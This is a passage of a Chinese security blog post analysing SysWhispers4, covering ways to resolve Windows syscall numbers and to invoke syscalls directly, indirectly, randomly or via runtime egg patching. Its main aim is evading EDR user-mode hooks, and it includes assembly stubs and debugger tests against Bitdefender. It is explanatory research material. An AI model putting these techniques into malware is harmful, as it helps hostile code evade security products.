+<li><code>pFn[0] == 0xEBu</code> (Short JMP)：由于 <code>ntdll</code> 许多空白字节空间，EDR 先通过一个短跳转 (<code>EB</code>) 跳到附近几字节外的空闲区，再在空闲区拼接一个大跳转。</li>
+</ol>
+<p>代码流程与Halo’s Gate大致一样，就是</p>
+<ol>
+<li>通过 PEB 定位 ntdll，遍历 EAT 收集所有 Nt* 导出</li>
+<li>按 VA 排序（插入排序），排序索引近似 SSN 顺序</li>
+<li>对每个目标函数：<ul>
+<li>先用 IsHooked() 检查入口字节（E9&#x2F;FF25&#x2F;E8&#x2F;CC&#x2F;EB）</li>
+<li>未 hook → 扫描 4C 8B D1 B8 提取 SSN</li>
+<li>已 hook → 搜索 ±16 邻居，跳过被 hook 的邻居</li>
+<li>从干净邻居推算：adjusted &#x3D; neighborSsn - (delta * dir)</li>
+<li>负数保护：adjusted &lt; 0 则跳过</li>
+<li>ASM stub 从表中读 SSN，直接执行 syscall</li>
+</ul>
+</li>
+</ol>
+<p>下图就是 <code>IsHooked</code> 的实现</p>
+<p><img src="https://images-of-oneday.oss-cn-guangzhou.aliyuncs.com/images%2F2026%2F06%2F11%2F20-27-12-f38d889e90cb75c032488e09ec790efd-PixPin_2026-06-11_20-27-04-ea0922.png" alt="PixPin_2026-06-11_20-27-04.png"></p>
+<p>主流程代码</p>
+<p><img src="https://images-of-oneday.oss-cn-guangzhou.aliyuncs.com/images%2F2026%2F06%2F11%2F20-28-11-12e95811a67403bed9ad5764a6d61de7-PixPin_2026-06-11_20-28-08-41629c.png" alt="PixPin_2026-06-11_20-28-08.png"></p>
+<p>运行效果</p>
+<p><img src="https://images-of-oneday.oss-cn-guangzhou.aliyuncs.com/images%2F2026%2F06%2F11%2F20-34-52-508fa8c0290b4b58ee5c97d68123c8fb-PixPin_2026-06-11_20-34-48-38ac63.png" alt="PixPin_2026-06-11_20-34-48.png"></p>
+<p>说实话，与其主动猜测AV&#x2F;EDR的Hook指令，不如检查前4字节是不是 <code>4C 8B D1 B8</code>，且没有合理的Syscall头部特征，就一律判定为Hooked。</p>
+<h2 id="2-5-SyscallsFromDisk"><a href="#2-5-SyscallsFromDisk" class="headerlink" title="2.5 SyscallsFromDisk"></a>2.5 SyscallsFromDisk</h2><p>既然内存中的ntdll可能被hook，那就直接从磁盘上读一份干净的原始ntdll.dll。</p>
+<p>ntdll.dll的数据来源有两个途径</p>
+<ol>
+<li><code>\KnownDlls\ntdll.dll</code>：Windows启动时会把系统DLL预映射到 <code>\KnownDlls\</code> 这个Section Object里，用 NtOpenSection + NtMapViewOfSection直接映射干净副本，连磁盘都不用读。但不是所有系统都有这个section。</li>
+<li><code>磁盘直接读</code>（上面方法失效后的fallback方案，SysWhispers4未实现这个途径）：CreateFileW(“C:\Windows\System32\ntdll.dll”) 打开磁盘文件，CreateFileMappingW + MapViewOfFile映射到内存，磁盘上的ntdll.dll永远是干净的</li>
+</ol>
+<p><img src="https://images-of-oneday.oss-cn-guangzhou.aliyuncs.com/images%2F2026%2F06%2F19%2F19-43-44-be9e002f111a4fba085af3be0baeb7f1-PixPin_2026-06-19_19-43-38-bb784b.png" alt="PixPin_2026-06-19_19-43-38.png"></p>
+<p>有了ntdll的句柄之后，往后的大致流程是：</p>
+<ol>
+<li>解析PE → 导出表（EAT）</li>
+<li>遍历导出函数名，DJB2哈希匹配目标函数，获取其函数地址</li>
+<li>直接从函数入口扫描最多32字节找到 <code>4C 8B D1 B8</code> 的字节序列，然后读第5-6字节（2字节小端序）组成 SSN</li>
+</ol>
+<p><img src="https://images-of-oneday.oss-cn-guangzhou.aliyuncs.com/images%2F2026%2F06%2F19%2F19-44-12-a3ac7fee7264e97b0db84d162d79a070-PixPin_2026-06-19_19-44-08-9f49d2.png" alt="PixPin_2026-06-19_19-44-08.png"></p>
+<p>运行效果</p>
+<p><img src="https://images-of-oneday.oss-cn-guangzhou.aliyuncs.com/images%2F2026%2F06%2F19%2F16-51-16-4f450cef93edef0334f8c42926663f00-PixPin_2026-06-19_16-51-09-c388ab.png" alt="PixPin_2026-06-19_16-51-09.png"></p>
+<h2 id="2-6-RecycledGate"><a href="#2-6-RecycledGate" class="headerlink" title="2.6 RecycledGate"></a>2.6 RecycledGate</h2><p>在前面介绍了FreshyCalls方案：只靠排序获取SSN，但是它需要手动排除一些非系统调用的Nt函数</p>
+<p>而HellsGate只靠读字节获取SSN，不过当系统调用是stub被AV&#x2F;EDR hooked了，那么就找不到 <code>4C 8B D1 B8</code> 的特征字节序列了。</p>
+<p>RecycledGate把两种方法交叉验证：Nt函数排序后给一个候选SSN，特征字节序列匹配后给一个SSN，不一致时根据stub是否被hook决定信任哪个。</p>
+<p>大致流程就是：</p>
+<ol>
+<li>枚举所有Nt导出</li>
+<li>按地址排序</li>
+<li>FreshyCalls获取SSN</li>
+<li>Hell’s Gate获取SSN，进行交叉验证，如果一致，则获取的SSN可信度最高。</li>
+<li>不一致怎么办：不是常见Hook，就相信HellsGate方案的SSN，如果被Hook了，就相信FreshyCalls方案的SSN</li>
+</ol>
+<p>枚举所有Nt导出</p>
+<p><img src="https://images-of-oneday.oss-cn-guangzhou.aliyuncs.com/images%2F2026%2F06%2F19%2F17-01-27-a07aaedbc8c86f29ef0c078579f81da6-PixPin_2026-06-19_17-01-24-498d77.png" alt="PixPin_2026-06-19_17-01-24.png"></p>
+<p>按照函数导出地址从低到高排序，之后通过FreshyCalls获取SSN。</p>
+<p><img src="https://images-of-oneday.oss-cn-guangzhou.aliyuncs.com/images%2F2026%2F06%2F19%2F17-05-18-5de26f4850c6de7a51158c790bea05ac-PixPin_2026-06-19_17-05-15-1a68f8.png" alt="PixPin_2026-06-19_17-05-15.png"></p>
+<p>用Hell’s Gate验证，扫描Stub是否存在 <code>4C 8B D1 B8</code>，如果存在，则进入下一步的交叉校验。</p>
+<ul>
+<li><p>如果FreshyCalls获取SSN与Hell’s Gate获取的SSN一致，那么则获取的SSN可信度高。</p>
+</li>
+<li><p>如果不一致，则扫描stub是否存在常见的Hook，如果 </p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">JMP</span><br></pre></td></tr></table></figure>
+
+<p>、</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">JMP [rip]</span><br></pre></td></tr></table></figure>
+
+<p>、</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">INT3</span><br></pre></td></tr></table></figure>
+
+<p>、</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">short jump</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>若stub没有被Hook，则认为Hell’s Gate获取的SSN可信度高</li>
+<li>反之，stub被Hook，则认为FreshyCalls获取的SSN可信度高</li>
+</ul>
+</li>
+</ul>
+<p><img src="https://images-of-oneday.oss-cn-guangzhou.aliyuncs.com/images%2F2026%2F06%2F19%2F17-07-13-8ad40e490bd4952704ed7b0fe3a60621-PixPin_2026-06-19_17-07-09-abb797.png" alt="PixPin_2026-06-19_17-07-09.png"></p>
+<p>运行效果，下图是运行在bitdefender的环境下</p>
+<p><img src="https://images-of-oneday.oss-cn-guangzhou.aliyuncs.com/images%2F2026%2F06%2F19%2F17-37-59-b1ddbb6a636ae794b998b9d1b7b1ca15-PixPin_2026-06-19_17-37-54-515640.png" alt="PixPin_2026-06-19_17-37-54.png"></p>
+<p>下图是运行无任何Hook的环境下</p>
+<p><img src="https://images-of-oneday.oss-cn-guangzhou.aliyuncs.com/images%2F2026%2F06%2F19%2F17-42-38-23141ae5fe2151ca3df296932e42836b-PixPin_2026-06-19_17-41-00-f9ab8a.png" alt="PixPin_2026-06-19_17-41-00.png"></p>
+<h2 id="2-7-HW-Breakpoint"><a href="#2-7-HW-Breakpoint" class="headerlink" title="2.7 HW Breakpoint"></a>2.7 HW Breakpoint</h2><p> 硬件断点靠DR寄存器，DR0-DR3存断点地址，DR7控制是否启用，我们开源将断点设在syscall指令处（不是函数入口），此时mov eax, SSN已经执行完，EAX里就是SSN。编写一个VEH异常处理函数，VEH Handler捕获 <code>EXCEPTION_SINGLE_STEP</code>，读取ContextRecord-&gt;Rax &#x3D; SSN，跳过 syscall (Rip +&#x3D; 2)，继续执行，不真正调用 syscall。</p>
+<p>HW Breakpoint是目前最”干净”的方式，既不读可能被hook的字节，也不改代码，完全靠CPU硬件机制获取SSN。即使Stub被Hook了，如下面的例子，执行到syscall指令，其线程上下文中的EAX还是SSN。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">jmp 7FF84E170600</span><br><span class="line">int3 </span><br><span class="line">int3 </span><br><span class="line">int3 </span><br><span class="line">test byte ptr ds:[7FFE0308],1</span><br><span class="line">jne ntdll.7FF84E0635B5</span><br><span class="line">syscall </span><br><span class="line">ret </span><br><span class="line">int 2E</span><br><span class="line">ret </span><br></pre></td></tr></table></figure>
+
+<p>代码实现细节可以参考项目源码，毕竟SysWhispers4是开源项目，下面就通过动态调试验证3个目标</p>
+<ol>
+<li>DR0是否被设置成目标Nt函数的syscall指令的地址</li>
+<li>是否触发异常，且CPU执行流程跳转到VEH处理函数</li>
+<li>即使目标系统调用stub被Hook的情况下，EAX&#x2F;RAX存储的还是SSN</li>
+</ol>
+<p><strong>验证1</strong>：DR0是否被设置成目标Nt函数的syscall指令的地址。</p>
+<p>其实也不用特意下断点，我的目标是 <code>NtAllocateVirtualMemory</code>，如果DR0正确设置成stub的syscall指令的地址，x64dbg会停在这里。可以观察到 <code>DR0 = 00007FF96FFB06C2</code>，而 <code>NtAllocateVirtualMemory</code> 的syscall指令地址 &#x3D; <code>00007FF96FFB06C2</code>。</p>
+<p><img src="https://images-of-oneday.oss-cn-guangzhou.aliyuncs.com/images%2F2026%2F06%2F19%2F19-11-35-b486206f21dd360183baa2c1049bf805-PixPin_2026-06-19_19-11-33-878c74.png" alt="PixPin_2026-06-19_19-11-33.png"></p>
+<p><strong>验证2</strong>：是否触发异常，且CPU执行流程跳转到VEH处理函数</p>
+<p>首先在<code>VehHandler</code>下一个断点</p>
+<p><img src="https://images-of-oneday.oss-cn-guangzhou.aliyuncs.com/images%2F2026%2F06%2F19%2F19-15-24-9337dda8cb003276758816ee66f080ae-PixPin_2026-06-19_19-15-22-d70b4c.png" alt="PixPin_2026-06-19_19-15-22.png"></p>
+<p>然后继续运行程序，刚好停在了我下的断点处，说明已触发 <code>EXCEPTION_SINGLE_STEP</code> 异常，且跳转到了 <code>VehHandler</code> 异常处理函数。</p>
+<p><img src="https://images-of-oneday.oss-cn-guangzhou.aliyuncs.com/images%2F2026%2F06%2F19%2F19-16-16-f2d93be71636d4c7ea936b7ecf263ffb-PixPin_2026-06-19_19-16-12-c1dc2b.png" alt="PixPin_2026-06-19_19-16-12.png"></p>
+<p><strong>验证3</strong>：即使目标系统调用stub被Hook的情况下，EAX&#x2F;RAX存储的还是SSN</p>
+<p>接下来，我换到BitDefender的环境下继续调试，在 <code>VehHandler</code> 下一个断点，然后继续调试到 <code>mov dword ptr ds:[&lt;g_CapturedSsn&gt;],eax </code></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">00007FF63CE44F62 | 8905 14830900            | mov dword ptr ds:[&lt;g_CapturedSsn&gt;],eax </span><br></pre></td></tr></table></figure>
+
+<p>观察Rax &#x3D; 0x18 &#x3D; 24，这说明即使目标系统调用stub被Hook的情况下，我们还是得到了 <code>NtAllocateVirtualMemory</code> 的正确SSN。</p>
+<p><img src="https://images-of-oneday.oss-cn-guangzhou.aliyuncs.com/images%2F2026%2F06%2F19%2F19-22-22-f050c852cd9666c4cd22b0b5db85da98-PixPin_2026-06-19_19-22-19-f46b30.png" alt="PixPin_2026-06-19_19-22-19.png"></p>
+<p>运行效果</p>
+<p><img src="https://images-of-oneday.oss-cn-guangzhou.aliyuncs.com/images%2F2026%2F06%2F19%2F19-28-53-d9dbc42e88072d3ee5723e3c7ac74d08-PixPin_2026-06-19_19-28-51-a27d39.png" alt="PixPin_2026-06-19_19-28-51.png"></p>
+<h1 id="三、调用方式（syscall-指令怎么执行）"><a href="#三、调用方式（syscall-指令怎么执行）" class="headerlink" title="三、调用方式（syscall 指令怎么执行）"></a>三、调用方式（syscall 指令怎么执行）</h1><table>
+<thead>
+<tr>
+<th>方法</th>
+<th>syscall 在哪</th>
+<th>RIP 位置</th>
+<th>抗静态扫描</th>
+<th>抗动态检测</th>
+<th>实现复杂度</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>Embedded</td>
+<td>本进程 <code>.text</code></td>
+<td>非 <code>ntdll</code></td>
+<td>弱</td>
+<td>弱</td>
+<td>低</td>
+</tr>
+<tr>
+<td>Indirect</td>
+<td><code>ntdll</code> 固定地址</td>
+<td><code>ntdll</code></td>
+<td>中</td>
+<td>中</td>
+<td>中</td>
+</tr>
+<tr>
+<td>Randomized</td>
+<td><code>ntdll</code> 随机地址</td>
+<td><code>ntdll</code></td>
+<td>中</td>
+<td>强</td>
+<td>高</td>
+</tr>
+<tr>
+<td>Egg</td>
+<td>本进程运行时替换</td>
+<td>非 <code>ntdll</code></td>
+<td>最强</td>
+<td>弱</td>
+<td>高</td>
+</tr>
+</tbody></table>
+<h2 id="3-1-Embedded"><a href="#3-1-Embedded" class="headerlink" title="3.1 Embedded"></a>3.1 Embedded</h2><p><strong>原理</strong>： syscall指令写在自己的代码里，直接执行。例如下面的汇编代码</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">NtAllocateVirtualMemory PROC</span><br><span class="line">    mov r10, rcx</span><br><span class="line">    mov eax, DWORD PTR [SyscallTable + 0]</span><br><span class="line">    syscall                    ; ← 本进程内执行</span><br><span class="line">    ret</span><br><span class="line">NtAllocateVirtualMemory ENDP</span><br></pre></td></tr></table></figure>
+
+<p><strong>检测特征</strong>： RIP不在ntdll内，EDR通过RIP位置就能判断这不是正常调用。</p>
+<p><img src="https://images-of-oneday.oss-cn-guangzhou.aliyuncs.com/images%2F2026%2F06%2F19%2F20-35-52-7666538f2e956966cbfdd48689cf2e36-PixPin_2026-06-19_20-35-47-2978a6.png" alt="PixPin_2026-06-19_20-35-47.png"></p>
+<h2 id="3-2-Indirect"><a href="#3-2-Indirect" class="headerlink" title="3.2 Indirect"></a>3.2 Indirect</h2><p><strong>原理</strong>： SSN还是在自己代码里加载，但不执行syscall，而是jmp到ntdll里的 <code>syscall;ret</code> 的gadget。例如下面的汇编代码</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">NtAllocateVirtualMemory PROC</span><br><span class="line">    mov r10, rcx</span><br><span class="line">    mov eax, DWORD PTR [SsnTable + 0]</span><br><span class="line">    jmp QWORD PTR [SyscallAddrTable + 0]   ; → ntdll 的 syscall;ret</span><br><span class="line">NtAllocateVirtualMemory ENDP</span><br></pre></td></tr></table></figure>
+
+<p><strong>检测特征</strong>： RIP在ntdll内，看起来像正常调用。但每次调用跳到同一个固定地址，行为模式可被统计。</p>
+<p><img src="https://images-of-oneday.oss-cn-guangzhou.aliyuncs.com/images%2F2026%2F06%2F19%2F20-38-58-7dc092db81e29fa9cb02c35eba4d6252-PixPin_2026-06-19_20-38-54-198a04.png" alt="PixPin_2026-06-19_20-38-54.png"></p>
+<h2 id="3-3-Randomized"><a href="#3-3-Randomized" class="headerlink" title="3.3 Randomized"></a>3.3 Randomized</h2><p><strong>原理</strong>： 在ntdll的可执行段中扫描所有0F 05 C3（syscall;ret），收集到 64 个的池子里。每次调用时用rdtsc（CPU时间戳计数器）做随机源，从池中随机选一个。例如下面的汇编代码</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">NtAllocateVirtualMemory PROC</span><br><span class="line">    mov  r10, rcx              ; arg1 → r10</span><br><span class="line">    mov  r11, rdx              ; 保存 arg2（rdx 被 rdtsc 覆盖）</span><br><span class="line">    rdtsc                      ; eax = TSC 低 32 位（熵源）</span><br><span class="line">    xor  eax, edx              ; 混合高低位</span><br><span class="line">    and  eax, 63               ; &amp; 0x3F → 随机索引 [0,63]</span><br><span class="line">    lea  rcx, [GadgetPool]</span><br><span class="line">    mov  rcx, QWORD PTR [rcx + rax*8]  ; rcx = 随机 gadget 地址</span><br><span class="line">    mov  rdx, rdx              ; 恢复 arg2</span><br><span class="line">    mov  eax, DWORD PTR [SsnTable + 0]</span><br><span class="line">    jmp  rcx                   ; → 随机的 ntdll syscall;ret</span><br><span class="line">NtAllocateVirtualMemory ENDP</span><br></pre></td></tr></table></figure>
+
+<p><strong>检测特征</strong>： 每次调用的RIP地址不同，行为模式随机化，难以通过单一地址或调用频率检测。</p>
+<p><img src="https://images-of-oneday.oss-cn-guangzhou.aliyuncs.com/images%2F2026%2F06%2F19%2F20-39-32-000011eaf0f25d03aa9567b00c77a0f4-PixPin_2026-06-19_20-39-29-289578.png" alt="PixPin_2026-06-19_20-39-29.png"></p>
+<h2 id="3-4-Egg"><a href="#3-4-Egg" class="headerlink" title="3.4 Egg"></a>3.4 Egg</h2><p><strong>原理</strong>：磁盘上的二进制不含0F 05（syscall）。stub里放的是8 字节随机标记（egg）。运行时HatchEggs() 扫描自己的 .text 段，找到所有egg占位符并替换成<code>0F 05 90 90 90 90 90 90</code>（syscall + 6 NOP）。</p>
+<p>ASM stub（编译时）：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">NtAllocateVirtualMemory PROC</span><br><span class="line">    mov r10, rcx</span><br><span class="line">    mov eax, DWORD PTR [SsnTable + 0]</span><br><span class="line">    DB 48h, B8h, DEh, ADh, BEh, EFh, CAh, FEh  ; egg 占位符</span><br><span class="line">    ret</span><br><span class="line">NtAllocateVirtualMemory ENDP</span><br><span class="line"></span><br><span class="line">HatchEggs() 核心逻辑：</span><br><span class="line">// 扫描自己的 .text 段</span><br><span class="line">for (PBYTE p = textStart; p &lt; textEnd - 8; p++) &#123;</span><br><span class="line">    if (memcmp(p, eggPattern, 8) == 0) &#123;</span><br><span class="line">        DWORD old;</span><br><span class="line">        VirtualProtect(p, 8, PAGE_EXECUTE_READWRITE, &amp;old);</span><br><span class="line">        p[0] = 0x0F; p[1] = 0x05;           // syscall</span><br><span class="line">        memset(p + 2, 0x90, 6);              // 6 NOP</span><br><span class="line">        VirtualProtect(p, 8, old, &amp;old);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p><strong>检测特征</strong>： 磁盘静态扫描找不到0F 05，绕过基于签名的检测。但运行时内存中会出现syscall，动态检测仍可捕获。</p>
+<p><img src="https://images-of-oneday.oss-cn-guangzhou.aliyuncs.com/images%2F2026%2F06%2F19%2F20-40-53-0095697a5ad03d644ffa2fbf42df9910-PixPin_2026-06-19_20-40-47-24e208.png" alt="PixPin_2026-06-19_20-40-47.png"></p>
+<h1 id="四、总结"><a href="#四、总结" class="headerlink" title="四、总结"></a>四、总结</h1><p>SysWhispers4的核心价值在于：通过动态获取SSN，并选择不同的syscall调用方式，绕过AV&#x2F;EDR在 <code>ntdll.dll</code> 上设置的用户态inline hook。</p>
+<p>但系统调用并不是万能的。它只能减少某些API hook带来的检测风险，并不能天然绕过行为分析、内存扫描、调用栈检测或内核侧监控。</p>
+<p>从测试结果也可以看到，即使使用直接或间接系统调用创建线程执行shellcode，仍然可能被Bitdefender拦截。这说明安全产品关注的不只是调用了哪个API，而是完整的行为链路，例如可执行内存、异常执行区域、线程创建、调用栈和内存权限变化等。</p>
+<p>因此，SysWhispers4 更适合作为理解Windows syscall、用户态Hook 和 EDR 检测机制的研究工具。它解决的是<strong>如何绕过 ntdll inline hook</strong>，而不是如何无条件绕过 EDR。</p>
+<p>这篇文章也是本月的最后一篇。下个月计划继续写两篇文章，可能会先发在先知社区，然后再同步到个人博客。</p>
+<p>第一篇文章会围绕 <code>Convert2Shellcode</code> 项目的完整重构方案展开，重点包括：</p>
+<ol>
+<li>运行上下文构造</li>
+<li>用户参数传递</li>
+<li>Rust程序不能直接转换为 shellcode 的问题（TLS Data）</li>
+<li>调用DLL指定导出函数</li>
+<li>清除旧PE数据</li>
+<li>抹除映射后的PE特征</li>
+<li>x86 EXE转shellcode的支持</li>
+<li><code>Convert2Shellcode</code> 与Iris Beacon睡眠混淆冲突的解决思路</li>
+</ol>
+<p>第二篇文章会重点讨论Iris Beacon的功能重构设计，这里暂时不过多展开。</p>
+<p>最后一个月，继续压榨一下自己，争取再给各位师傅带来两篇文章。回头看，从3月份开始每个月至少写一篇，居然也一路坚持到了现在，确实有点泪目 &gt;.&lt;</p>
+
+      </div>
+      
+        <div class="prev-or-next">
+          <div class="post-foot-next">
+            
+              <a href="/2026/05/23/%E7%9D%A1%E7%9C%A0%E6%B7%B7%E6%B7%86%EF%BC%88sleep-obfuscation%EF%BC%89/" target="_self">
+                <i class="iconfont icon-chevronleft"></i>
+                <span>Prev</span>
+              </a>
+            
+          </div>
+          <div class="post-attach">
+            <span class="post-pubtime">
+              <i class="iconfont icon-updatetime mr-10" title="Update time"></i>
+              2026-06-20 16:29:34
+            </span>
+            
+                  <span class="post-categories">
+                    <i class="iconfont icon-bookmark" title="Categories"></i>
+                    
+                    <span class="span--category">
+                      <a href="/categories/%E9%98%B2%E5%BE%A1%E8%A7%84%E9%81%BF/" title="防御规避">
+                        <b>#</b> 防御规避
+                      </a>
+                    </span>
+                    
+                  </span>
+              
+          </div>
+          <div class="post-foot-prev">
+            
+          </div>
+        </div>
+      
+    </div>
+    
+  <div id="btn-catalog" class="btn-catalog">
+    <i class="iconfont icon-catalog"></i>
+  </div>
+  <div class="post-catalog hidden" id="catalog">
+    <div class="title">Contents</div>
+    <div class="catalog-content">
+      
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E4%B8%80%E3%80%81%E6%A0%B8%E5%BF%83%E7%94%A8%E9%80%94"><span class="toc-text">一、核心用途</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#1-1-%E9%A1%B9%E7%9B%AE%E6%9E%B6%E6%9E%84"><span class="toc-text">1.1 项目架构</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#1-2-%E4%BD%95%E4%B8%BAInline-hook"><span class="toc-text">1.2 何为Inline-hook</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E4%BA%8C%E3%80%81SSN-%E8%A7%A3%E6%9E%90%E7%AD%96%E7%95%A5%EF%BC%88%E6%80%8E%E4%B9%88%E6%89%BE%E5%88%B0syscall%E7%BC%96%E5%8F%B7%EF%BC%89"><span class="toc-text">二、SSN 解析策略（怎么找到syscall编号）</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#2-1-FreshyCalls"><span class="toc-text">2.1 FreshyCalls</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2-2-Hell%E2%80%99s-Gate"><span class="toc-text">2.2 Hell’s Gate</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2-3-Halo%E2%80%99s-Gate"><span class="toc-text">2.3 Halo’s Gate</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2-4-Tartarus%E2%80%99-Gate"><span class="toc-text">2.4 Tartarus’ Gate</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2-5-SyscallsFromDisk"><span class="toc-text">2.5 SyscallsFromDisk</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2-6-RecycledGate"><span class="toc-text">2.6 RecycledGate</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2-7-HW-Breakpoint"><span class="toc-text">2.7 HW Breakpoint</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E4%B8%89%E3%80%81%E8%B0%83%E7%94%A8%E6%96%B9%E5%BC%8F%EF%BC%88syscall-%E6%8C%87%E4%BB%A4%E6%80%8E%E4%B9%88%E6%89%A7%E8%A1%8C%EF%BC%89"><span class="toc-text">三、调用方式（syscall 指令怎么执行）</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#3-1-Embedded"><span class="toc-text">3.1 Embedded</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#3-2-Indirect"><span class="toc-text">3.2 Indirect</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#3-3-Randomized"><span class="toc-text">3.3 Randomized</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#3-4-Egg"><span class="toc-text">3.4 Egg</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%9B%9B%E3%80%81%E6%80%BB%E7%BB%93"><span class="toc-text">四、总结</span></a></li></ol>
+      
+    </div>
+  </div>
+
+  
+<script src="/js/catalog.js"></script>
+
+
+
+
+    
+      <div class="comments-container">
+        
+
+
+
+
+  
+    <script async type="text/javascript" src="/plugins/valine.min.js" onload="loadValineSuc(this)"></script>
+  
+
+  <div id="vcomments"></div>
+
+  <script>
+    function loadValineSuc() {
+      new Valine({
+        el: '#vcomments',
+        appId: 'kr7nhXQQsnagsiZAr9IIxoDq-gzGzoHsz',
+        appKey: 'Sujqic7fHSzakqEntTDwEJp3',
+        placeholder: 'Welcome!',
+        avatar: 'retro',
+        lang: 'en'
+      })
+    }
+  </script>
+
+    <style>
+      .comments-container .v .vempty {
+        display: none!important;
+      }
+    </style>
+
+
+
+
+      </div>
+    
+  </div>
+
+
+        
+<div class="footer">
+  <div class="social">
+    <ul>
+      
+        <li>
+          
+              <a title="github" target="_blank" rel="noopener" href="https://github.com/onedays12">
+                <i class="iconfont icon-github"></i>
+              </a>
+              
+        </li>
+        
+    </ul>
+  </div>
+  
+    
+    <div class="footer-more">
+      
+        <a target="_blank" rel="noopener" href="https://github.com/onedays12">Copyright © 2026 oneday</a>
+        
+    </div>
+  
+    
+    <div class="footer-more">
+      
+        <a target="_blank" rel="noopener" href="https://github.com/zchengsite/hexo-theme-oranges">Theme by Oranges | Powered by Hexo</a>
+        
+    </div>
+  
+  
+</div>
+
+      </div>
+
+      <div class="tools-bar">
+        <div class="back-to-top tools-bar-item hidden">
+  <a href="javascript: void(0)">
+    <i class="iconfont icon-chevronup"></i>
+  </a>
+</div>
+
+
+<script src="/js/backtotop.js"></script>
+
+
+
+        
+  <div class="search-icon tools-bar-item" id="search-icon">
+    <a href="javascript: void(0)">
+      <i class="iconfont icon-search"></i>
+    </a>
+  </div>
+
+  <div class="search-overlay hidden">
+    <div class="search-content" tabindex="0">
+      <div class="search-title">
+        <span class="search-icon-input">
+          <a href="javascript: void(0)">
+            <i class="iconfont icon-search"></i>
+          </a>
+        </span>
+        
+          <input type="text" class="search-input" id="search-input" placeholder="Search...">
+        
+        <span class="search-close-icon" id="search-close-icon">
+          <a href="javascript: void(0)">
+            <i class="iconfont icon-close"></i>
+          </a>
+        </span>
+      </div>
+      <div class="search-result" id="search-result"></div>
+    </div>
+  </div>
+
+  <script type="text/javascript">
+    var inputArea = document.querySelector("#search-input")
+    var searchOverlayArea = document.querySelector(".search-overlay")
+
+    inputArea.onclick = function() {
+      getSearchFile()
+      this.onclick = null
+    }
+
+    inputArea.onkeydown = function() {
+      if(event.keyCode == 13)
+        return false
+    }
+
+    function openOrHideSearchContent() {
+      let isHidden = searchOverlayArea.classList.contains('hidden')
+      if (isHidden) {
+        searchOverlayArea.classList.remove('hidden')
+        document.body.classList.add('hidden')
+        // inputArea.focus()
+      } else {
+        searchOverlayArea.classList.add('hidden')
+        document.body.classList.remove('hidden')
+      }
+    }
+
+    function blurSearchContent(e) {
+      if (e.target === searchOverlayArea) {
+        openOrHideSearchContent()
+      }
+    }
+
+    document.querySelector("#search-icon").addEventListener("click", openOrHideSearchContent, false)
+    document.querySelector("#search-close-icon").addEventListener("click", openOrHideSearchContent, false)
+    searchOverlayArea.addEventListener("click", blurSearchContent, false)
+
+    var searchFunc = function (path, search_id, content_id) {
+      'use strict';
+      var $input = document.getElementById(search_id);
+      var $resultContent = document.getElementById(content_id);
+      $resultContent.innerHTML = "<ul><span class='local-search-empty'>First search, index file loading, please wait...<span></ul>";
+      $.ajax({
+        // 0x01. load xml file
+        url: path,
+        dataType: "xml",
+        success: function (xmlResponse) {
+          // 0x02. parse xml file
+          var datas = $("entry", xmlResponse).map(function () {
+            return {
